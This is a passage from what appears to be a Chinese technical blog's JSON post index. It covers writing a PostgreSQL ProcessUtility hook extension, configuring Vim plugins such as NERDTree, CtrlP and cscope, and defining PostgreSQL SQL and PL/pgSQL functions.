设置函数指针:当数据库载入共享库时[设置share_preload_libiaries],首先会将其载入内存中,然后从共享库调用_PG_init, 通过此函数来加载自己的Hook函数; contrib插件 123456void_PG_init(void)&#123; prev_proccessutility_hook = ProcessUtility_hook; //将我们定义的函数指针,指向Pg系统原有函数地址; 本身NULL; -- 起地址交换作用; ProcessUtility_hook = record_oper_info; //将系统指向我们需要其执行的函数;&#125; 取消函数指针设置: 那么与之相对应的，你要写一个_PG_fini函数在卸载(drop extension xxxx)的时候使用,也就是移除你的hook并且把它重置为之前的指针值。 12345void_PG_fini(void)&#123; ProcessUtility_hook = prev_proccessutility_hook; //卸载lib库时,指向原有函数;&#125; Postgresql 常见Hooks:12345678910111213extern PGDLLIMPORT check_password_hook_type check_password_hook; //处理用户密码时调用的Hook, 可以对用户的密码进行限制,增加密码的规范.static ExecutorStart_hook_type prev_ExecutorStart = NULL; //处理查询执行开始时调用的Hook;static ExecutorRun_hook_type prev_ExecutorRun = NULL; //处理查询执行时调用的hookstatic ExecutorFinish_hook_type prev_ExecutorFinish = NULL; //处理查询结束时调用的hookstatic ExecutorEnd_hook_type prev_ExecutorEnd = NULL; //处理查询完成后调用的hookstatic shmem_startup_hook_type prev_shmem_startup_hook = NULL; //在初始化共享内存是调用的hook static post_parse_analyze_hook_type prev_post_parse_analyze_hook = NULL;static object_access_hook_type next_object_access_hook = NULL;static ExecutorCheckPerms_hook_type next_exec_check_perms_hook = NULL; //处理访问权限时调用的hookstatic ProcessUtility_hook_type next_ProcessUtility_hook = NULL; //通用hook，可以处理很多的过程,。static ClientAuthentication_hook_type next_client_auth_hook = NULL; //处理链接时调用的hook,可以对链接进行管理;static needs_fmgr_hook_type next_needs_fmgr_hook = NULL;static fmgr_hook_type next_fmgr_hook = NULL; //函数调用潜的hook 代码演示alter_oper.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455//alter_oper.c#include \"postgres.h\"#include \"fmgr.h\"#include \"tcop/utility.h\"#ifdef PG_MODULE_MAGICPG_MODULE_MAGIC;#endifvoid _PG_init(void);void _PG_fini(void);staticProcessUtility_hook_type prev_proccessutility_hook = NULL; staticvoid record_oper_info(Node *parsetree, const char *queryString, ProcessUtilityContext context, ParamListInfo params, DestReceiver *dest, char *completionTag)&#123; switch (nodeTag(parsetree)) &#123; case T_DropStmt: case T_DropTableSpaceStmt: case T_DropdbStmt: ereport(NOTICE, (errmsg(\"Drop ? it`s not allowd\"))); break; default: break; &#125; standard_ProcessUtility(parsetree, queryString, context, params, dest, completionTag);&#125;void_PG_init(void)&#123; prev_proccessutility_hook = ProcessUtility_hook; //将我们定义的函数指针,指向Pg系统原有函数地址; 本身NULL; -- 起参数交换作用; ProcessUtility_hook = record_oper_info; //将系统指向我们需要其执行的函数;&#125;void_PG_fini(void)&#123; ProcessUtility_hook = prev_proccessutility_hook; //卸载lib库时,指向原有函数;&#125; alter_oper.control 12345# alter_oper.controlcomment = 'Pg Judicious function'default_version = '1.0'module_pathname = '$libdir/alter_oper'relocatable = true Makefile 12345678910111213141516# contrib/alter_oper/MakefileMODULES = alter_operEXTENSION = alter_operPGFILEDESC = \"alter_oper - Pg Hook test\"REGRESS = alter_operifdef USE_PGXSPG_CONFIG = pg_configPGXS := $(shell $(PG_CONFIG) --pgxs)include $(PGXS)elsesubdir = contrib/alter_opertop_builddir = ../..include $(top_builddir)/src/Makefile.globalinclude $(top_srcdir)/contrib/contrib-global.mkendif postgresql.conf 12## postgresql.confshared_preload_libraries = &apos;alter_oper&apos; # (change requires restart) 验证1234567891011shell=# \\d List of relations Schema | Name | Type | Owner ----------------+------+-------+-------- oracle_catalog | dual | view | Pg public | std | table | Pg(2 rows)shell=# drop table std ;NOTICE: 00000: Drop ? it`s not allowd ===&gt; 输出;DROP TABLE 补充your_extension--1.0.control 里面主要是写一些控制信息， your_extension--1.0.sql 用于创建一些你需要的数据库对象，比如表，触发器，函数等等。 只有在扩展Sql函数中才会使用，Hook不需要； 模板下载模板代码下载","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Database/"},{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"}]},{"title":"打造自己的 Vim","slug":"software/打造自己的-Vim","date":"2018-09-27T11:35:33.000Z","updated":"2019-08-22T13:27:10.338Z","comments":true,"path":"2018/09/27/software/打造自己的-Vim/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/09/27/software/打造自己的-Vim/","excerpt":"将自己的GVIM实现成为: 能自由显示/关闭目录栏 能实现自由文件搜索 [精准搜索/正则模糊搜索] 设置工作目录，并进行目录跳转-能在新目录文件搜索 全局文件关键字搜索 代码阅读 相关函数调用，定义等查看 代码静态检查 代码注释功能，提供snippets YCM - Mac 已安装，Linux 与 Window 未安装 快捷键 F2 开启/关闭nerdtree F3 开启/关闭 Taglist F4 开启/关闭 quickfix面板 [ CtrlSF/ cscope ] “\\” + s 打开静态代码检查错误面板 Ctrl + p 文件搜索 Ctrl + b 文件搜索列表 Ctrl + r 开启/关闭模糊匹配 Ctrl + v 在当前文件 竖直方式打开新文件 Ctrl + y 在当前目录添加新文件 Ctrl + t 在新建Tab页打开 Ctrl + f 全局关键字搜索 Shift + s 查找代码函数链接 Shift + c 查找调用本函数的函数 Shift + g 查找本定义 Alt + Num 进行Tab页的切换 Alt + t 打开新的Tab页","text":"将自己的GVIM实现成为: 能自由显示/关闭目录栏 能实现自由文件搜索 [精准搜索/正则模糊搜索] 设置工作目录，并进行目录跳转-能在新目录文件搜索 全局文件关键字搜索 代码阅读 相关函数调用，定义等查看 代码静态检查 代码注释功能，提供snippets YCM - Mac 已安装，Linux 与 Window 未安装 快捷键 F2 开启/关闭nerdtree F3 开启/关闭 Taglist F4 开启/关闭 quickfix面板 [ CtrlSF/ cscope ] “\\” + s 打开静态代码检查错误面板 Ctrl + p 文件搜索 Ctrl + b 文件搜索列表 Ctrl + r 开启/关闭模糊匹配 Ctrl + v 在当前文件 竖直方式打开新文件 Ctrl + y 在当前目录添加新文件 Ctrl + t 在新建Tab页打开 Ctrl + f 全局关键字搜索 Shift + s 查找代码函数链接 Shift + c 查找调用本函数的函数 Shift + g 查找本定义 Alt + Num 进行Tab页的切换 Alt + t 打开新的Tab页 搭建环境: Win 10 CentOS 7.1 前述: 本文不讲解如何在window安装Gvim，学习window安装vim请阅读请点击 包管理PluginInstal PluginClean 不在此说明 相关插件下载请看文章末尾 Linux-vim-8.0123456789yum install ncurses-devel wget https://github.com/vim/vim/archive/master.zip unzip master.zip cd vim-master cd src/ ./configure --enable-multibyte --enable-pythoninterp=yesmake sudo make install vim --version 重新编译的时候，想要支持 python2.x，则加入 --enable-pythoninterp=yes 参数。如果想开启 Python3 支持，则 --enable-python3interp=yes。 Tab标签页切换123456789:tabnew [++opt选项] ［＋cmd］ 文件 建立对指定文件新的tab:tabc 关闭当前的tab:tabo 关闭所有其他的tab:tabs 查看所有打开的tab:tabp 前一个:tabn 后一个标准模式下：gt , gT 可以直接在tab之间切换。更多可以查看帮助 :help table ， help -p Vimrc快捷键设置: Alt被xshell占用，未配置; 1234567891011nn &lt;M-1&gt; 1gtnn &lt;M-2&gt; 2gtnn &lt;M-3&gt; 3gtnn &lt;M-4&gt; 4gtnn &lt;M-5&gt; 5gtnn &lt;M-6&gt; 6gtnn &lt;M-7&gt; 7gtnn &lt;M-8&gt; 8gtnn &lt;M-9&gt; 9gtnn &lt;M-0&gt; :tablast&lt;CR&gt;nn &lt;M-t&gt; :tabnew&lt;CR&gt; 菜单栏包安装: 1Bundle &apos;scrooloose/nerdtree&apos; 参数配置: 1234567&quot; nerdTree快捷键映射let NERDTreeWinPos=&apos;left&apos;let NERDTreeWinSize=25map &lt;F2&gt; :NERDTreeToggle&lt;CR&gt;&quot; 如果最后一个是nerdTree 则自动关闭;autocmd bufenter * if (winnr(&quot;$&quot;) == 1 &amp;&amp; exists(&quot;b:NERDTreeType&quot;) &amp;&amp;b:NERDTreeType == &quot;primary&quot;) | q | endif F2 启动/关闭菜单栏 模式: 123456789通过 ctrl + w 加上方向键切换到 NERDTree 工具条，键入 m：NERDTree Menu. Use j/k/enter and the shortcuts indicated==========================================================&gt; (a)dd a childnode # 一个节点，可以是文件或者文件夹 (m)ove the current node # 移动或者重命名当前节点 (d)elete the current node # 删除当前节点 (c)opy the current node (l)ist the current node 文件搜索包安装 1Plugin &apos;ctrlpvim/ctrlp.vim&apos; Vimrc配置: 123456789101112let g:ctrlp_map = &apos;&lt;c-p&gt;&apos;let g:ctrlp_cmd = &apos;CtrlP&apos;let g:ctrlp_match_window = &apos;min:4,max:15&apos; &quot; 最大匹配15;let g:ctrlp_max_depth=20let g:ctrlp_follow_symlinks=1let g:ctrlp_use_caching=0 &quot;未启用 ； 每个回话的缓存; -let g:ctrlp_clear_cache_on_exit=0 &quot;退出vim不删除缓存文件;let g:ctrlp_cache_dir=$HOME.&apos;/.cache/ctrlp&apos; &quot;设置缓存目录; -- 如果添加文件 请F5重建;let g:ctrlp_working_path_mode = &apos;rw&apos; &quot;用于支持lcd目录跳转，重建索引; CtrlPRoot&quot; 单个版本控制系统，列出命令不会列出没有被追踪的文件:let g:ctrlp_user_command = [&apos;.git&apos;, &apos;cd %s &amp;&amp; git ls-files&apos;]set wildignore+=*\\\\node_modules\\\\*,*.git*,*.svn*,*.zip*,*.exe* &quot; 使用vim的忽略文件 我们在VIm中使用lcd 切换目录。 当我们切换时 需要在配置文件中开启let g:ctrlp_working_path_mode = &#39;rw&#39; 用于建立当前目录下的索引。 来快速搜索， 不然索引还是保持在之前文件中。 :help CtrlP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748总览:~ |loaded_ctrlp|................禁用插件。 |ctrlp_map|...................默认按键绑定。 |ctrlp_cmd|...................默认按键绑定调用的命令。 |ctrlp_by_filename|...........是否默认开启文件名模式。 |ctrlp_regexp|................是否默认开启正则表达式模式。 |ctrlp_match_window|..........匹配窗口的显示位置。 |ctrlp_switch_buffer|.........如果文件已在缓冲区中打开，跳转到该打开的缓冲区。 |ctrlp_reuse_window|..........重用特殊窗口（帮助、快速修复 |quickfix| ，等等）。 |ctrlp_tabpage_position|......新标签页出现的位置。 |ctrlp_working_path_mode|.....如何设置CtrlP的本地工作目录。 |ctrlp_root_markers|..........额外的，高优先级的根目录标识。 |ctrlp_use_caching|...........针对每个会话，设置是否开启缓存的。 |ctrlp_clear_cache_on_exit|...退出Vim后是否保留缓存。 |ctrlp_cache_dir|.............缓存目录的位置。 |ctrlp_show_hidden|...........是否显示隐藏文件和隐藏文件夹。 |ctrlp_custom_ignore|.........使用 |globpath()| 时自定义忽略的文件或目录。 |ctrlp_max_files|.............扫描文件的最大数目。 |ctrlp_max_depth|.............扫描目录的最大层数。 |ctrlp_user_command|..........使用外部的扫描工具。 |ctrlp_max_history|...........历史提示符面板中保留的最大条目数。 |ctrlp_open_new_file|.........由&lt;c-y&gt;创建的文件的打开方式。 |ctrlp_open_multiple_files|...由&lt;c-z&gt;选择的文件的打开方式。 |ctrlp_arg_map|...............是否拦截&lt;c-y&gt; 和 &lt;c-o&gt; 命令。 |ctrlp_follow_symlinks|.......是否跟随链接。 |ctrlp_lazy_update|...........停止输入时才更新。 |ctrlp_default_input|.........为提示符面板提供一个初始字符串。 |ctrlp_abbrev|................输入缩写。 |ctrlp_key_loop|..............为多字节输入开启输入事件循环。 |ctrlp_prompt_mappings|.......改变提示符面板内部的按键绑定。 |ctrlp_line_prefix|...........ctrlp 窗口中为每一行添加前缀。 |ctrlp_open_single_match|.....当只有一个候选时自动接受。 |ctrlp_brief_prompt|..........提示符为空的时候使用&lt;bs&gt;退出 CtrlP。 |ctrlp_match_current_file|....在匹配条目中包含当前文件。 |ctrlp_types|.................內建类型的名称。 &lt;F5&gt; - 刷新匹配窗口并且清除当前目录的缓存。 - 从最近最多使用中移除被删除的文件。 &lt;F7&gt; 最近最多使用模式： - 清除最近最多使用列表。 - 删除被 &lt;c-z&gt; 标记的最近最多使用条目。 缓冲区模式： - 删除光标下的条目或者删除被 &lt;c-z&gt; 标记的多个条目。 常用操作 Ctrl + b 切换， 从缓冲区， 最近文件 与 目录 — 查找位置; Ctrl + r 切换 字符串与正则表达式之间切换。 Ctrl + v 在当前文件 竖直方式打开新文件 Ctrl + y 在当前目录添加新文件。 Ctrl + t 在新建Tab页打开 F5 重建当前目录文件，并且删除 最近打开文件中， 已删除文件 F7 删除最近打开文件。 全局文件内关键字搜索存在插件有 EasyGrep Ack.vim 但是vim本身即实现此种操作 1vim /tablespace_sizeofcu/ ** | copen 12341. 只搜索当前文件 vim /main/ % | copen2. 只搜索当前目录 vim /main/ * | copen 3. 搜索上级目录下，并递归 vim /main/ ../** | copen4. 可以在多个路径中搜索 vim /main path1/** path2/** | copen 效率太慢 CtrlSF 包安装: 1Plugin &apos;dyng/ctrlsf.vim&apos; Vimrc配置: 1234567nnoremap &lt;C-f&gt; :CtrlSF&lt;Space&gt;let g:ctrlsf_default_view_mode = &apos;compact&apos;let g:ctrlsf_ackprg=&apos;ack&apos; &quot; 设置为ag;let g:ctrlsf_auto_close=0 &quot;设置不自动关闭;let g:ctrlsf_case_sensitive=&apos;no&apos; &quot;大小写不敏感;let g:ctrlsf_ignore_dir=[&apos;tags&apos;, &apos;.git&apos;, &apos;.svn&apos;] &quot;忽略tags;let g:ctrlsf_default_root=&apos;project&apos; CtrlSF_default_root 12345678910111213141516171819202122232425262728g:ctrlsf_default_root *&apos;g:ctrlsf_default_root&apos;*Default: &apos;cwd&apos;Available: &apos;cwd&apos;, &apos;project&apos;, &apos;project+xx&apos;Defines how CtrlSF works if no explicit search path is given. Possible valueis &apos;cwd&apos;,&apos;project&apos; and &apos;project+xx&apos;.(&apos;xx&apos; is two sub-options for &apos;project&apos;.)Explanation for each option:&apos;cwd&apos; - Use current working directory.&apos;project&apos; - CtrlSF will try to find project root from current file to its ancestors. A project root is a directory with VCS folder is placed in. Currently CtrlSF can recognize .git, .hg, .svn, .bzr, _darcs.&apos;project+xx&apos; - Same as &apos;project&apos;. But you can have more control about how project directory is found and fallback root if no project root is found. First &apos;x&apos; defines from where to search project root. It has 2 possible values: &apos;f&apos; - search from current file. &apos;w&apos; - search from current working directory. Second &apos;x&apos; defines the fallback search root for the case project root is not found. It has 2 possible values: &apos;f&apos; - current file is fallback search root. &apos;w&apos; - current working directory is fallback search root. Option &apos;project&apos; is identical to &apos;project+ff&apos;. 检索更快的 ag 12345678yum -y groupinstall &quot;Development Tools&quot;yum -y install pcre-devel xz-develsudo git clone https://github.com/ggreer/the_silver_searcher.gitcd the_silver_searchersudo ./build.shsudo make installwhich ag==&gt; /usr/local/bin/ag cscope 代码跳转 cscopen 本身就是Unix血统，是Linux所自动支持的。 window下载cscope 解压后放置在 vim 同目录即可[不需再修改环境变量]。 1cscope -Rbq 生成索引文件 1234567891011121314151617181920212223242526cscope commands:add : Add a new database (Usage: add file|dir [pre-path] [flags])find : Query for a pattern (Usage: find a|c|d|e|f|g|i|s|t name) a: Find assignments to this symbol c: Find functions calling this function d: Find functions called by this function e: Find this egrep pattern f: Find this file g: Find this definition i: Find files #including this file s: Find this C symbol t: Find this text stringhelp : Show this message (Usage: help)kill : Kill a connection (Usage: kill #)reset: Reinit all connections (Usage: reset)show : Show connections (Usage: show) 0 或 s 查找本 C 符号(可以跳过注释) 1 或 g 查找本定义 2 或 d 查找本函数调用的函数 3 或 c 查找调用本函数的函数 4 或 t 查找本字符串 6 或 e 查找本 egrep 模式 7 或 f 查找本文件 8 或 i 查找包含本文件的文件 Vimrc 参数配置; 12345678910111213141516171819202122232425&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; cscope setting&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;setcscopequickfix=s-,c-,d-,i-,t-,e-if has(&quot;cscope&quot;) set csprg=/usr/bin/cscope set csto=1 set cst set nocsverb &quot; add any database in current directory if filereadable(&quot;cscope.out&quot;) cs add cscope.out endif set csverbendifnmap &lt;S-s&gt; :cs find s &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;nmap &lt;S-g&gt; :cs find g &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;nmap &lt;S-c&gt; :cs find c &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;nmap &lt;S-t&gt; :cs find t &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;nmap &lt;S-e&gt; :cs find e &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;nmap &lt;S-f&gt; :cs find f &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;nmap &lt;S-i&gt; :cs find i ^&lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;$&lt;CR&gt;nmap &lt;S-d&gt; :cs find d &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt; Shit+ 热键即可使用; 但window并不能显示qiuckfix窗口 后添加 :copen 1nmap &lt;S-c&gt; :cs find c &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;:copen&lt;CR&gt;&lt;CR&gt; 能自动打开qiuckFix窗口，但是会自动跳转到第一个； 1nmap &lt;S-c&gt; :cs find c &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt; :bd&lt;CR&gt; :copen&lt;CR&gt;/&lt;C-R&gt;0&lt;CR&gt; :bd&lt;CR&gt; - 删除缓冲区，所以这会关闭第一个搜索结果, 但多个Tab标签页，将会被关闭. 使用Tab请删掉bd :copen&lt;CR&gt; - 在当前打开quickfix窗口 /&lt;C-R&gt;0&lt;CR&gt;-打开搜索结果 - 搜索的第0个 静态代码检查包安装: 12&quot; 静态代码检查;Bundle &apos;scrooloose/syntastic&apos;s Vimrc配置: 1234567891011121314151617181920212223242526272829&quot;静态代码检查;&quot; 设置错误符号let g:syntastic_error_symbol=&apos;✗&apos;let g:syntastic_warning_symbol=&apos;&gt;&apos;let g:syntastic_check_on_open=1let g:syntastic_check_on_wq=0let g:syntastic_enable_highlighting=1let g:syntastic_python_checkers=[&apos;pyflakes&apos;] &quot; 使用pyflakes,速度比pylint快let g:syntastic_javascript_checkers = [&apos;jsl&apos;, &apos;jshint&apos;]let g:syntastic_html_checkers=[&apos;tidy&apos;, &apos;jshint&apos;]&quot; 修改高亮的背景色, 适应主题&quot;highlight SyntasticErrorSign guifg=white guibg=black&quot; to error location listlet g:syntastic_always_populate_loc_list = 0let g:syntastic_auto_loc_list = 0let g:syntastic_loc_list_height = 5function! ToggleErrors() let old_last_winnr = winnr(&apos;$&apos;) lclose if old_last_winnr == winnr(&apos;$&apos;) &quot; Nothing was closed, open syntastic error location panel Errors endifendfunction&quot; &lt;Leader&gt; &quot;\\&quot; + s nnoremap &lt;Leader&gt;s :call ToggleErrors()&lt;cr&gt; \\ + s 打开错误显示面板 格式化代码包安装: 1Plugin &apos;Chiel92/vim-autoformat&apos; Vimrc配置: 12noremap &lt;F5&gt; :Autoformat&lt;CR&gt;let g:autoformat_verbosemode=1 代码助手需要使用tab键，尽量与YCM不要冲突; 12Plugin &apos;honza/vim-snippets&apos;Plugin &apos;SirVer/ultisnips&apos; 代码提示 YCM (未装)下载Window配置文件window-cscope Linux-配置文件与bundle包Linux-vim-8.0linux-agvim-配置ctags+taglistBash-配置powerline","categories":[{"name":"Vim篇","slug":"Vim篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Vim篇/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Software","slug":"Software","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Software/"}]},{"title":"postgresql扩展SQL与存储过程","slug":"database/Postgresql扩展SQL与存储过程","date":"2018-09-18T11:04:50.000Z","updated":"2019-09-18T12:19:33.012Z","comments":true,"path":"2018/09/18/database/Postgresql扩展SQL与存储过程/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/09/18/database/Postgresql扩展SQL与存储过程/","excerpt":"Pg系统本身提供不同扩展,可以通过select * from pg_language 来查看支持 123456lanname | lanowner | lanispl | lanpltrusted | lanplcallfoid | laninline | lanvalidator | lanacl----------+----------+---------+--------------+---------------+-----------+--------------+-------- internal | 10 | f | f | 0 | 0 | 2246 | c | 10 | f | f | 0 | 0 | 2247 | sql | 10 | f | t | 0 | 0 | 2248 | plpgsql | 10 | t | t | 13335 | 13336 | 13337 |","text":"Pg系统本身提供不同扩展,可以通过select * from pg_language 来查看支持 123456lanname | lanowner | lanispl | lanpltrusted | lanplcallfoid | laninline | lanvalidator | lanacl----------+----------+---------+--------------+---------------+-----------+--------------+-------- internal | 10 | f | f | 0 | 0 | 2246 | c | 10 | f | f | 0 | 0 | 2247 | sql | 10 | f | t | 0 | 0 | 2248 | plpgsql | 10 | t | t | 13335 | 13336 | 13337 | internal内部函数都是用C写的函数，它们已经通过静态链接的方式嵌入 PostgreSQL服务器进程中了。 函数定义的”函数体”确定了函数的C语言名称， 它不必与给 SQL 使用的名称相同。出于向下兼容考虑， 一个空的函数体也可以被接受， 这意味着 C 函数名与 SQL 函数名相同。 通常，所有在服务器里出现的内部函数都在数据库初始化时定义。 但是用户可以用CREATE FUNCTION为内部函数创建额外的别名。 内部函数在CREATE FUNCTION命令里是带着internal语言名声明的。 1234CREATE FUNCTION square_root(double precision) RETURNS double precision AS 'dsqrt' LANGUAGE internal STRICT; pg_proc.h 需要在pg源码中添加c执行函数(静态编译到Postgres) 示例 Pg源码添加系统函数 创建函数相同, 直接在psql中create function 即可。 c用户定义的函数可以用 C 写(或者是与C兼容的语言，比如C++)。 这样的函数被编译进动态加载对象(共享库)并且由服务器根据需要加载。 动态加载的特性是”C 语言函数”和”内部函数”之间的区别—不过， 实际的编码习惯在两者之间实际上是一样的。 需要在pg中添加C代码(插件形式) 在插件sql代码中 或者 单独执行 create function 用来动态加载 sa &#39;$libdir/xxx&#39; 查找相应动态库 示例 共享库 插件 sql 方法是把该函数的返回类型声明为SETOF *sometype*。 或者等价声明它为RETURNS TABLE(*columns*)。 这种情况下，最后一条查询结果的所有行都会被返回。 12345CREATE FUNCTION clean_emp() RETURNS voidAS $$ DELETE FROM emp WHERE salary &lt; 0; $$ LANGUAGE SQL; plpgsql 123456789CREATE OR REPLACE FUNCTION clean_emp() RETURNS void AS $$ [ &lt;&lt;label&gt;&gt; ] [ DECLARE declaration ] BEGIN statements END [label];$$ LANGUAGE PLPGSQL; 中括号部分为可选部分 块中的每一个declaration和每一条statement都由一个分号终止 块支持嵌套，嵌套时子块的END后面必须跟一个分号，最外层的块END后可不跟分号 BEGIN后面不必也不能跟分号 END后跟的label名必须和块开始时的标签名一致 所有关键字都不区分大小写。标识符被隐含地转换成小写字符，除非被双引号包围 声明的变量在当前块及其子块中有效，子块开始前可声明并覆盖（只在子块内覆盖）外部块的同名变量 变量被子块中声明的变量覆盖时，子块可以通过外部块的label访问外部块的变量 存储过程存储过程(Stored Procedure)是大型数据库系统中，一组为了完成特定功能的SQL语句集，存储在数据库中，首次编译后再次调用不需要再次编译，用户通过指定存储过程的名字并给出参数(如果有)来执行它。它是数据库中的一个重要对象，任何一个设计良好的数据库应用程序都应该用到存储过程。 Postgresql对存储过程的描述是:存储过程和用户定义的函数(UDF)是SQL和过程语句的集合，它存储于数据库服务器并能呗SQL接口调用。 存储过程特性: 存储于数据库服务器 一次编译后可多次调用 由SQL和过程语句来定义 应用程序通过SQL接口来调用 sql /PLSql的区别: SQL 是结构化查询语言，比较接近自然语言，使用SQL，只需要说干什么，不需要说怎么干。有数据定义语言，数据操纵语言，数据控制语言构成。 它不面向对象，即前一句与后一句无关。SQL是标准的语句。 PL/SQL ，Oracle对SQL标准的扩充，增加了面向过程功能，所以可以用来编写存储过程，存储函数，触发器等等。PL/SQL是结构化的SQL，就是在标准SQL中加入了 IF..ELSE. FOR... 等控制过程的SQL PL/SQL是块结构语言,意味着程序可以分成若干逻辑块,各自包含那个单元里要求的逻辑语言资源。可以对块宣布本地变量，在块中使用这些变量,可在它们应用的块中特别地处理错误条件(叫做Exceptions) 基于SQL的存储过程定义12345CREATE OR REPLACE FUNCTION add(a INTEGER, b NUMERIC)RETURNS NUMERICAS $$ SELECT a+b;$$ LANGUAGE SQL; 包含输入输出 12345CREATE OR REPLACE FUNCTION plus_and_minus(IN a INTEGER, IN b NUMERIC, OUT c NUMERIC, OUT d NUMERIC)AS $$ SELECT a+b, a-b;$$ LANGUAGE SQL; 在函数定义中，可以编写任意合法SQL语句，不一定是select ，但最后一条SQL必须是select语句，并且该sql的结果将作为该函数的输出结果 1234567CREATE OR REPLACE FUNCTION plus_and_minus(IN a INTEGER, IN b NUMERIC, OUT c NUMERIC, OUT d NUMERIC)AS $$ SELECT a+b, a-b; INSERT INTO test VALUES('test1'); SELECT a-b, a+b;$$ LANGUAGE SQL; 结果如下: 12345SELECT * FROM plus_and_minus(5,3); c | d---+--- 2 | 8(1 row) 基于pl/pgsql存储过程定义PL/pgsql是一个块结构语言，函数定义的所有文本都必须是一个块。 123456[ &lt;&lt;label&gt;&gt; ][ DECLARE declaration ]BEGIN statementsEND [label]; 中括号部分为可选部分 块中的每一个declaration和每一条statement都由一个分号终止 块支持嵌套，嵌套时子块的END后面必须跟一个分号，最外层的块END后可不跟分号 BEGIN后面不必也不能跟分号 END后跟的label名必须和块开始时的标签名一致 所有关键字都不区分大小写。标识符被隐含地转换成小写字符，除非被双引号包围 声明的变量在当前块及其子块中有效，子块开始前可声明并覆盖（只在子块内覆盖）外部块的同名变量 变量被子块中声明的变量覆盖时，子块可以通过外部块的label访问外部块的变量 123456789101112131415161718192021CREATE FUNCTION somefunc() RETURNS integer AS $$DECLARE quantity integer := 30; -- 赋值;BEGIN -- Prints 30 RAISE NOTICE 'Quantity here is %', quantity; quantity := 50; -- Create a subblock DECLARE quantity integer := 80; BEGIN -- Prints 80 RAISE NOTICE 'Quantity here is %', quantity; -- Prints 50 RAISE NOTICE 'Outer quantity here is %', outerblock.quantity; END; -- Prints 50 RAISE NOTICE 'Quantity here is %', quantity; RETURN quantity;END;$$ LANGUAGE plpgsql; 返回多列PostgreSQL除了支持自带类型外，还支持用户创建自定义类型。在这里可以自定义一个复合类型，并在函数中返回一个该复合类型的值，从而实现返回一行多列 1234567891011121314151617CREATE TYPE compfoo AS (col1 INTEGER, col2 TEXT);CREATE OR REPLACE FUNCTION getCompFoo(in_col1 INTEGER, in_col2 TEXT)RETURNS compfooAS $$DECLARE result compfoo;BEGIN result.col1 := in_col1 * 2; result.col2 := in_col2 || '_result'; RETURN result;END;$$ LANGUAGE PLPGSQL;SELECT * FROM getCompFoo(1,'1'); col1 | col2------+---------- 2 | 1_result(1 row) 使用SETOF返回多行记录12345678910111213141516CREATE TYPE compfoo AS (col1 INTEGER, col2 TEXT); -- 也可以返回一列;CREATE OR REPLACE FUNCTION getSet(rows INTEGER)RETURNS SETOF compfooAS $$BEGIN RETURN QUERY SELECT i * 2, i || '_text' FROM generate_series(1, rows, 1) as t(i);END;$$ LANGUAGE PLPGSQL;SELECT col1, col2 FROM getSet(2); col1 | col2------+-------- 2 | 1_text 4 | 2_text(2 rows) 使用return table返回多行多列1234567891011121314CREATE OR REPLACE FUNCTION getTable(rows INTEGER)RETURNS TABLE(col1 INTEGER, col2 TEXT)AS $$BEGIN RETURN QUERY SELECT i * 2, i || '_text' FROM generate_series(1, rows, 1) as t(i);END;$$ LANGUAGE PLPGSQL;SELECT col1, col2 FROM getTable(2); col1 | col2------+-------- 2 | 1_text 4 | 2_text(2 rows) 多态SQL函数SQL函数可以声明为接受多态类型(anyelement 和 anyarray )的参数或返回多态类型的返回值。 函数参数和返回值均为多态类型，其调用方式和调用其他类型的SQL函数完全相同，只是在传递字符串类型的参数时，需要显示转换到目标类型，否则会被认为unknown类型。 12345678910CREATE OR REPLACE FUNCTION get_array(anyelement, anyelement)RETURNS anyarrayAS $$ SELECT ARRAY[$1, $2];$$ LANGUAGE SQL;SELECT get_array(1,2), get_array('a'::text,'b'::text); get_array | get_array -----------+----------- &#123;1,2&#125; | &#123;a,b&#125;(1 row) 函数参数为多态类型，而返回值为基本类型 123456789101112131415CREATE OR REPLACE FUNCTION is_greater(anyelement, 